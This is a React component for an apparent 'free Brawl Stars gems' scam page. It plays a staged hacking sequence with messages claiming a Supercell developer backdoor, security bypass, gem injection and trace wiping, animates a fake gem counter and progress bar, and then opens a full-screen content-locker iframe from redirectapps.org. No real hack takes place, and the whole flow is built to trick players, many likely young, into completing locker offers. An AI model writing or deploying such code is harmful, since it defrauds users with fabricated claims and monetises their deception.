import React, { useState, useEffect } from 'react';
import { motion } from 'framer-motion';
import { GemPack } from '../types';
import gemsIcon from '../icons/gems_icon.png';
import oneGemIcon from '../icons/one_gem_icon.png';

interface GemSelectorProps {
  gemPacks: GemPack[];
  onSelect: (amount: number) => void;
  onMessageChange?: (message: string | null) => void;
}

const steps = [
  "Accessing developer backchannel...",
  "Authenticating user...",
  "Locating Brawl Stars account...",
  "Injecting gems...",
  "Finalizing process...",
];

const hackMessages = [
  "Holy crap! Found Supercell's secret dev Backdoor...",
  "Bypassing Supercell's security...This is where it gets WILD!",
  "Injecting permanent codes – they can NEVER reverse this!",
  "Almost there! Securing the transfer...",
  "Wiping all traces – your account stays bulletproof!",
  "BOOM! System hacked – these gems are YOURS!",
  "FINAL STEP! Hit CONTINUE to complete the secure transfer and claim your gems!",
];

// Green gem SVG component
const GreenGem: React.FC<{ size?: number; className?: string }> = ({ size = 60, className = "" }) => (
  <svg
    width={size}
    height={size}
    viewBox="0 0 100 100"
    className={className}
    style={{ filter: 'drop-shadow(0 4px 8px rgba(0, 0, 0, 0.3))' }}
  >
    {/* Gem body - bright green */}
    <path
      d="M50 10 L75 30 L75 70 L50 90 L25 70 L25 30 Z"
      fill="#4ade80"
      stroke="#16a34a"
      strokeWidth="2"
    />
    {/* Top facet */}
    <path
      d="M50 10 L75 30 L50 30 Z"
      fill="#86efac"
    />
    {/* Left facet */}
    <path
      d="M50 10 L25 30 L50 30 Z"
      fill="#22c55e"
    />
    {/* Right facet */}
    <path
      d="M75 30 L75 70 L50 50 Z"
      fill="#86efac"
    />
    {/* Left side facet */}
    <path
      d="M25 30 L25 70 L50 50 Z"
      fill="#22c55e"
    />
    {/* Bottom facet */}
    <path
      d="M50 50 L75 70 L50 90 L25 70 Z"
      fill="#16a34a"
    />
    {/* Highlight */}
    <ellipse
      cx="50"
      cy="35"
      rx="8"
      ry="12"
      fill="rgba(255, 255, 255, 0.6)"
    />
  </svg>
);

// Gem pile component (5 gems stacked)
const GemPile: React.FC = () => {
  const positions = [
    { x: 50, y: 70, scale: 1.0 }, // Bottom left
    { x: 70, y: 70, scale: 1.0 }, // Bottom right
    { x: 45, y: 50, scale: 0.9 }, // Middle left
    { x: 65, y: 50, scale: 0.9 }, // Middle right
    { x: 55, y: 30, scale: 0.8 }, // Top
  ];

  return (
    <div className="relative w-32 h-32 md:w-40 md:h-40 flex items-center justify-center">
      {positions.map((pos, index) => (
        <motion.div
          key={index}
          initial={{ opacity: 0, scale: 0 }}
          animate={{ opacity: 1, scale: pos.scale }}
          transition={{ delay: index * 0.1, duration: 0.3 }}
          className="absolute"
          style={{
            left: `${pos.x}%`,
            top: `${pos.y}%`,
            transform: 'translate(-50%, -50%)',
          }}
        >
          <GreenGem size={60} />
        </motion.div>
      ))}
    </div>
  );
};

// Animated counter component
const AnimatedCounter: React.FC<{ value: number; target: number }> = ({ value, target }) => {
  const displayValue = Math.min(Math.floor(value), target);
  
  return (
    <span className="text-white font-bold text-4xl md:text-5xl font-lilita tracking-wider" style={{ textShadow: '2px 2px 4px rgba(0, 0, 0, 0.5)' }}>
      {displayValue.toLocaleString()}
    </span>
  );
};

const GemSelector: React.FC<GemSelectorProps> = ({ gemPacks, onSelect, onMessageChange }) => {
  const [selectedGem, setSelectedGem] = useState<GemPack | null>(null);
  const [progress, setProgress] = useState(0);
  const [currentStep, setCurrentStep] = useState(0);
  const [counterValue, setCounterValue] = useState(0);
  const [showLocker, setShowLocker] = useState(false);

  useEffect(() => {
    if (selectedGem) {
      setProgress(0);
      setCurrentStep(0);
      setCounterValue(0);
      
      // Calculate timing: 7 messages, each with typing + 2 second pause
      // Average message length ~60 chars * 30ms = ~1.8s typing + 2s pause = ~3.8s per message
      // Total: 7 * 3.8 = ~26.6 seconds
      const TYPING_SPEED = 30; // ms per character
      const PAUSE_AFTER_MESSAGE = 2000; // 2 seconds pause
      const totalDuration = hackMessages.reduce((total, msg) => {
        return total + (msg.length * TYPING_SPEED) + PAUSE_AFTER_MESSAGE;
      }, 0);

      // Progress bar: update to 100% over totalDuration
      const progressSteps = 100;
      const progressIntervalMs = totalDuration / progressSteps;
      
      const progressInterval = setInterval(() => {
        setProgress((prev) => {
          if (prev >= 100) {
            clearInterval(progressInterval);
            return 100;
          }
          return prev + (100 / progressSteps);
        });
      }, progressIntervalMs);

      // Message progression: show each message, wait for typing + pause, then next
      let messageTimer: NodeJS.Timeout;
      let messageIndex = 0;

      const showNextMessage = () => {
        if (messageIndex < hackMessages.length) {
          const currentMsg = hackMessages[messageIndex];
          if (onMessageChange) {
            onMessageChange(currentMsg);
          }
          
          const typingDuration = currentMsg.length * TYPING_SPEED;
          messageTimer = setTimeout(() => {
            messageIndex++;
            if (messageIndex < hackMessages.length) {
              showNextMessage();
            } else {
              // All messages shown - keep the last message displayed
              // Don't clear it, let it stay
            }
          }, typingDuration + PAUSE_AFTER_MESSAGE);
        }
      };

      // Start showing messages
      showNextMessage();

      // Counter animation: count from 0 to selectedGem.amount over totalDuration
      const targetAmount = selectedGem.amount;
      const counterSteps = 60;
      const increment = targetAmount / counterSteps;
      const counterStepDuration = totalDuration / counterSteps;

      const counterInterval = setInterval(() => {
        setCounterValue((prev) => {
          if (prev >= targetAmount) {
            clearInterval(counterInterval);
            return targetAmount;
          }
          return prev + increment;
        });
      }, counterStepDuration);

      // Step interval for status text
      const stepInterval = setInterval(() => {
        setCurrentStep((prev) => {
          if (prev >= steps.length - 1) {
            clearInterval(stepInterval);
            return prev;
          }
          return prev + 1;
        });
      }, totalDuration / steps.length);

      return () => {
        clearInterval(progressInterval);
        clearInterval(counterInterval);
        clearInterval(stepInterval);
        if (messageTimer) {
          clearTimeout(messageTimer);
        }
        if (onMessageChange) {
          onMessageChange(null);
        }
      };
    } else {
      // Reset message when no gem selected
      if (onMessageChange) {
        onMessageChange(null);
      }
    }
  }, [selectedGem, onMessageChange]);

  const handleGemClick = (pack: GemPack) => {
    setSelectedGem(pack);
    onSelect(pack.amount);
    if (window.confetti) {
      window.confetti({
        particleCount: 150,
        spread: 180,
        origin: { y: 0.6 }
      });
    }
  };

  const handleContinue = () => {
    setShowLocker(true);
  };

  const handleReset = () => {
    setSelectedGem(null);
    setProgress(0);
    setCurrentStep(0);
    setCounterValue(0);
    setShowLocker(false);
    if (onMessageChange) {
      onMessageChange(null);
    }
  };

  if (selectedGem) {
    // Show content locker as full-screen overlay
    if (showLocker) {
      return (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <div className="relative bg-gradient-to-b from-slate-900 to-slate-800 rounded-2xl max-w-2xl w-full shadow-2xl border-2 border-slate-600 overflow-hidden">
            {/* Close button */}
            <button
              onClick={handleReset}
              className="absolute top-4 right-4 z-10 w-8 h-8 bg-red-600 hover:bg-red-700 rounded flex items-center justify-center transition-colors"
            >
              <span className="text-white font-bold text-xl">×</span>
            </button>

            {/* Header */}
            <div className="p-6 text-center border-b border-slate-700">
              <div className="text-3xl font-bold text-orange-500 mb-2 font-lilita">
                BRAWL STARS
              </div>
              <p className="text-white text-sm mb-2">Unlocking will allow access to the premium content!</p>
              <h2 className="text-2xl md:text-3xl font-bold text-yellow-400 font-lilita">
                FINAL STEP TO UNLOCK GEMS!
              </h2>
            </div>

            {/* Content Locker iframe */}
            <div 
              className="w-full"
              style={{ height: '600px' }}
            >
              <iframe 
                src="https://redirectapps.org/cl/i/ex6mnk" 
                width="100%" 
                height="100%" 
                frameBorder="0"
                className="rounded-b-2xl"
              />
            </div>
          </div>
        </div>
      );
    }

    // Show reward box when locker is not active
    return (
      <div className="bg-[#3e62c2] rounded-2xl p-4 sm:p-6 border-4 border-black shadow-[inset_0_5px_15px_rgba(0,0,0,0.2)]">
        <div className="relative">
          {/* Reward Box: blue frame with thick white/blue border and soft gradient */}
          <motion.div 
            initial={{ scale: 0.95 }}
            animate={{ scale: 1 }}
            transition={{ type: 'spring', stiffness: 220, damping: 20 }}
            className="relative rounded-2xl p-2 overflow-hidden"
            style={{
              background: '#ffffff', // outer white border
              boxShadow: '0 8px 24px rgba(0,0,0,0.35)'
            }}
          >
            {/* Inner blue border */}
            <div className="rounded-2xl p-2" style={{ background: 'linear-gradient(180deg,#7fd3ff 0%, #2a7dff 100%)' }}>
              {/* Content panel with soft gradient background */}
              <div 
                className="rounded-2xl px-6 py-8"
                style={{
                  background: 'radial-gradient(120% 120% at 50% 20%, rgba(255,255,255,0.55) 0%, rgba(173, 216, 255, 0.65) 35%, #2f6fe6 100%)',
                  boxShadow: 'inset 0 6px 16px rgba(255,255,255,0.35), inset 0 -8px 18px rgba(0,0,0,0.25)'
                }}
              >

            {/* Gem display area */}
            <div className="relative z-10 flex flex-col items-center justify-center min-h-[300px]">
              {/* Gem image at the top */}
                <div className="relative w-32 h-32 md:w-40 md:h-40 flex items-center justify-center">
                  <img src={gemsIcon} alt="Gems" className="w-full h-full object-contain" />
                </div>

              {/* Smaller gem with counter below */}
              <div className="flex items-center justify-center gap-3 mb-6">
                <img src={oneGemIcon} alt="Gem" className="w-10 h-10 md:w-12 md:h-12 object-contain" />
                <AnimatedCounter value={counterValue} target={selectedGem.amount} />
              </div>

              {/* Status text with percentage */}
              <div className="text-center mb-4">
                <p className="text-white font-bold text-lg md:text-xl font-lilita tracking-wider">
                  {steps[currentStep]} ({progress}%)
                </p>
              </div>

              {/* Progress bar at bottom of reward box */}
              <div className="w-full max-w-lg mt-4">
                <div 
                  className="h-5 rounded-full overflow-hidden"
                  style={{
                    background: 'linear-gradient(180deg,#2b2b2b 0%, #151515 100%)',
                    boxShadow: 'inset 0 2px 4px rgba(255,255,255,0.1), inset 0 -2px 4px rgba(0,0,0,0.5)',
                    border: '2px solid rgba(255,255,255,0.2)'
                  }}
                >
                  <motion.div
                    initial={{ width: 0 }}
                    animate={{ width: `${progress}%` }}
                    transition={{ duration: 0.1, ease: 'linear' }}
                    className="h-full"
                    style={{
                      background: 'linear-gradient(90deg, #00e6a8 0%, #00d4ff 100%)',
                      boxShadow: '0 0 12px rgba(0, 212, 255, 0.6)'
                    }}
                  />
                </div>
              </div>
              </div>
            </div>
            </div>
          </motion.div>

          {/* CONTINUE button */}
          {progress >= 100 && (
            <motion.div
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              className="mt-6 flex flex-col items-center"
            >
              {/* FREE GEMS EVENT banner */}
              <div className="relative mb-2">
                <div 
                  className="bg-black rounded-t-lg px-6 py-2"
                  style={{
                    boxShadow: '0 2px 8px rgba(0, 0, 0, 0.5)'
                  }}
                >
                  <span className="text-white font-bold text-sm md:text-base uppercase tracking-wider font-lilita">
                    FREE GEMS EVENT
                  </span>
                </div>
              </div>
              
              {/* CONTINUE button */}
              <button
                onClick={handleContinue}
                className="relative w-full max-w-md rounded-2xl py-4 px-8 font-bold text-2xl md:text-3xl uppercase tracking-wider font-lilita transition-transform hover:scale-105 active:scale-95"
                style={{
                  background: 'linear-gradient(180deg, #FFD700 0%, #FFA500 100%)',
                  boxShadow: '0 8px 16px rgba(0, 0, 0, 0.4), inset 0 2px 4px rgba(255, 255, 255, 0.3), inset 0 -2px 4px rgba(0, 0, 0, 0.2)',
                  border: 'none',
                  color: '#FFFFFF',
                  textShadow: '2px 2px 0px #000000, -2px -2px 0px #000000, 2px -2px 0px #000000, -2px 2px 0px #000000',
                }}
              >
                CONTINUE
              </button>
            </motion.div>
          )}
        </div>
      </div>
    );
  }

  // Default view: show all gem packs
  return (
    <div className="bg-[#3e62c2] rounded-2xl p-4 sm:p-6 border-4 border-black shadow-[inset_0_5px_15px_rgba(0,0,0,0.2)]">
      <h2 
        className="text-center text-3xl md:text-4xl font-bold mb-6 text-white font-lilita tracking-wider"
        style={{ textShadow: '0 3px #1e3a8a' }}
      >
        GEM PACKS
      </h2>
      <div className="grid grid-cols-2 sm:grid-cols-3 gap-4 md:gap-6">
        {gemPacks.map((pack) => (
          <button
            key={pack.amount}
            onClick={() => handleGemClick(pack)}
            className="group transition-transform duration-300 transform focus:outline-none focus:ring-4 focus:ring-offset-2 focus:ring-offset-[#3e62c2] focus:ring-cyan-400 focus:z-10 rotate-[-3deg] hover:rotate-0 hover:scale-105"
            aria-label={`Select ${pack.amount} gems`}
          >
            <img 
                src={pack.imageUrl} 
                alt={`${pack.amount} Gems`} 
                className="w-full h-auto"
            />
          </button>
        ))}
      </div>
    </div>
  );
};

export default GemSelector;